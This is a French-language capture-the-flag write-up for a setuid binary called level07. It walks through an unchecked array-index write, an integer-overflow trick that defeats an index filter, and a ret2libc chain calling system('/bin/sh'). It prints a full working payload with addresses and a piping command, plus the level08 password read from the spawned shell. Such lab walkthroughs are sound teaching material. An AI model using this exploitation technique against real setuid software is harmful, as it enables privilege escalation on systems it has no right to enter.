# Level07

### Repérage

```
ls -la
-rwsr-s---+ 1 level08 users ... level07
```

Bit setuid + propriétaire level08, donc le binaire tourne avec les droits de level08. Si on obtient un shell, il sera en level08.

Le programme est un "service de stockage de nombres" avec 3 commandes :
- `store` : écrit un nombre (4 octets) à un index donné (offset = index * 4)
- `read`  : relit le nombre stocké à un index donné
- `quit`  : quitte

### Analyse Ghidra

Les données sont stockées dans `local_1bc[100]` (tableau de 100 uint sur la stack de main).

```
store_number(data) :
    Number: uVar1 = get_unum();   // valeur a écrire
    Index:  uVar2 = get_unum();   // ou l'écrire
    if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
        // ERROR: index réservé pour "wil"
    } else {
        *(uint *)(uVar2 * 4 + data) = uVar1;   // write sans vérif sur l'index (pas de size check)
    }

read_number(data) :
    Index: iVar1 = get_unum();
    printf(" Number at data[%u] is %u\n", iVar1, *(data + iVar1*4));  // read sans vérif sur l'index
```

### La faille

Aucune vérification de taille sur l'index. On peut donc écrire 4 octets n'importe où par rapport à `data` : c'est un write-what-where.
- quoi = Number (la valeur)
- ou   = data + index * 4 (*4 pour passer au prochain elem on est sur des uint de 4 octets)

Comme `data` est sur la stack, on peut écrire au-delà du tableau, jusqu'à la saved adresse de retour de main. `read` sert à sonder la mémoire pour valider les offsets.

### Deux garde-fous

- `uVar2 % 3 == 0` : l'index saisi ne doit pas être multiple de 3.
- `uVar1 >> 0x18 == 0xb7` : l'octet de poids fort de la valeur ne doit pas valoir 0xb7. Ce check est censé bloquer les adresses de la libc (typiquement 0xb7... sur ces cibles). On verra plus bas que sur ma VM la libc est ailleurs (0xf7...), donc ce garde-fou tombe à l'eau et c'est exactement ce qui rend le ret2libc possible.

### Le plan : ret to libc

Pas de shellcode. Au lieu d'injecter du code, on réutilise `system()` qui est déjà dans la libc. On écrase la saved EIP de main avec l'adresse de `system`, et on prépare sa pile pour qu'il exécute `system("/bin/sh")`.

Pourquoi ret2libc plutôt que shellcode-sur-pile : le shellcode oblige à écrire l'adresse absolue du buffer dans la saved EIP, et cette adresse bouge selon la taille de l'environnement -> ca marche sur une VM, pas sur une autre. Le ret2libc lui n'a AUCUNE adresse de pile en dur : on ne manipule que des adresses de la libc. Donc plus de dépendance à l'env.

Le layout qu'on écrit à partir de la saved EIP :

```
data[114] = &system      saved EIP -> system s'exécute au ret de main
data[115] = &exit        adresse de retour de system (sortie propre)
data[116] = &"/bin/sh"   argument de system
```

Mécanique : quand main fait `ret` (au `quit`), il dépile `data[114]` dans EIP -> c'est `system`. Juste après ce dépilement, `esp` pointe sur `data[115]`. `system` lit alors son adresse de retour en `[esp]` (= `exit`) et son premier argument en `[esp+4]` (= `"/bin/sh"`). Donc `system("/bin/sh")` -> shell level08. Quand on quitte le shell, `system` retourne sur `exit` -> ca se termine proprement au lieu de crasher.

### Pourquoi ca passe le garde-fou 0xb7

Le check refuse les valeurs dont l'octet de poids fort vaut 0xb7. C'est un anti-ret2libc : sur les vieilles cibles la libc est en 0xb7xxxxxx, donc `&system` serait bloqué.

Sauf que sur ma VM la libc est mappée en **0xf7xxxxxx**. `system`, `exit` et la chaîne `/bin/sh` commencent donc tous par 0xf7, pas 0xb7 -> le filtre ne les voit pas. Le garde-fou vise la mauvaise plage. C'est à vérifier au cas par cas (voir plus bas `p/x (int)system`) : si ca sort du 0xb7 chez toi, le ret2libc est mort et il faut repasser au shellcode.

### Contournement du check %3

Le programme fait deux choses avec l'index :
- il check `index % 3 == 0` (et refuse si c'est le cas)
- il utilise `index * 4` comme offset d'écriture

L'idée : le check et l'offset regardent l'index différemment, on exploite cet écart.

L'index est un uint 32 bits. Si on ajoute 0x40000000 à l'index :
```
0x40000000 * 4 = 0x100000000
```
0x100000000 ne rentre pas dans 32 bits -> il déborde et le bit en trop est jeté -> il reste 0. Donc ajouter 0x40000000 à l'index NE CHANGE PAS l'offset final (index*4).

Par contre pour le check `% 3`, ca change tout car :
```
0x40000000 % 3 = 1
```
Donc saisir `index + 0x40000000` garde le même offset d'écriture mais décale le modulo de +1 : le check voit `(index + 1) % 3` au lieu de `index % 3`.

Ici on n'a que 3 index à écrire (114, 115, 116) :
```
index 114  (114%3=0, bloqué) -> +0x40000000 -> saisir 1073741938  (%3=1, OK)
index 115  (115%3=1, OK)     -> saisir 115 tel quel
index 116  (116%3=2, OK)     -> saisir 116 tel quel
```
En clair : seul 114 est multiple de 3, c'est le seul qu'on doit maquiller.

### Trouver l'index de la saved EIP

Ce qu'on cherche : la saved EIP, c'est l'adresse de retour de main, celle vers laquelle le CPU saute quand main fait `ret` (donc quand on tape quit). Reste à savoir à quel index elle se trouve par rapport au début du buffer.

On sait écrire à `data + index*4` donc :
```
index = (adresse_saved_EIP - data) / 4
```

On déduit une estimation du prologue de main (`disas main`) : frame de 0x1d0 (464) octets, `data` à esp+0x24 (36), plus les registres sauvés et l'alignement `and $0xfffffff0` -> ~114. Mais l'alignement retire un nombre d'octets variable selon l'env, donc 114 est une estimation à confirmer.

Confirmation par sondage. On écrit une valeur reconnaissable (45) à l'index candidat, on la relit avec `read` pour vérifier qu'on tape bien là, puis on quitte :

```
Input command: store
 Number: 45
 Index: 1073741938        // = 0x40000000 + 114 (esquive le %3)
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 45   // on relit bien 45 -> l'index vise la bonne case
Input command: quit
Segmentation fault (core dumped)
```

Le segfault au quit est la preuve : le `ret` de main a sauté sur 45 (adresse invalide) au lieu de retourner normalement. Donc l'index 114 tombe bien sur la saved EIP. Si le programme s'était terminé proprement, 114 ne visait pas la saved EIP -> on aurait balayé les voisins (113, 115, 116...) jusqu'au segfault.

À partir de là, il suffit de remplacer 45 par `&system` : le `ret` sautera dans system au lieu de crasher.

### Trouver system, exit et /bin/sh

Tout se récupère dans gdb. On casse sur main pour que la libc soit déjà mappée :

```
gdb ./level07
(gdb) break main
(gdb) run

(gdb) p/x (int)system
$1 = 0xf7e6aed0

(gdb) p/x (int)exit
$2 = 0xf7e5eb70

(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

- `p/x (int)system` / `p/x (int)exit` : adresses des deux fonctions. Au passage on vérifie qu'elles commencent bien par 0xf7 (et pas 0xb7) -> le filtre les laisse passer.
- `find &system, +9999999, "/bin/sh"` : cherche la chaîne littérale `/bin/sh` dans la libc à partir de system. Le résultat est **la première ligne** (`0xf7f897ec`). Attention piège : le `0xf7fd3b74` du warning n'est PAS un résultat, c'est juste l'endroit où gdb a buté sur de la mémoire illisible et stoppé la recherche.

On peut confirmer la chaîne :
```
(gdb) x/s 0xf7f897ec
0xf7f897ec:     "/bin/sh"
```

### Convertir en décimal pour store

`store` lit la valeur avec `scanf %u` -> il faut donner chaque adresse en décimal (pas en hexa) :

```
python3 -c 'print(0xf7e6aed0)'   # system  -> 4159090384
python3 -c 'print(0xf7e5eb70)'   # exit    -> 4159040368
python3 -c 'print(0xf7f897ec)'   # /bin/sh -> 4160264172
```

### Le payload

```
store
4159090384
1073741938
store
4159040368
115
store
4160264172
116
quit
```

Décodage ligne par ligne :

```
data[114] = 4159090384  (0xf7e6aed0 system)    index saisi 1073741938  (114 +0x40000000, esquive %3)
data[115] = 4159040368  (0xf7e5eb70 exit)      index saisi 115         (115%3=1, OK)
data[116] = 4160264172  (0xf7f897ec "/bin/sh") index saisi 116         (116%3=2, OK)
quit -> ret de main -> system("/bin/sh")
```

### Injection finale

Le `-` après le fichier est ESSENTIEL : il garde stdin ouvert après le fichier. Sinon le shell obtenu reçoit tout de suite EOF et meurt sans qu'on puisse taper.

```
cat payload.txt - | ./level07
...
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

### Piège : ASLR

gdb désactive l'ASLR par défaut. Donc les adresses vues dans gdb (0xf7e6aed0...) ne sont valides en exécution réelle QUE si l'ASLR est aussi désactivé hors gdb. À vérifier :

```
cat /proc/sys/kernel/randomize_va_space
```

- `0` -> ASLR off. Les adresses gdb = adresses réelles. Le ret2libc est déterministe et robuste à l'env. C'est le cas ici.
- `2` -> ASLR on. La libc bouge à chaque run, les adresses gdb sont un leurre, ces valeurs ne tiendront pas -> il faudrait un leak, ou repasser au shellcode-sur-pile.